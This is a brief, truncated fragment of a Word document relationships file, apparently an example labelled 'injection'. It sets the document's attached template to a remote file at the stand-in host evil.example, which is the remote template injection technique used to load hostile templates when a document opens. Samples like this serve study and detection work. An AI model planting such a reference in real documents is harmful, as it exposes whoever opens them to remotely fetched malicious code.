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injection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
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
   Target="https://evil.example/template.dot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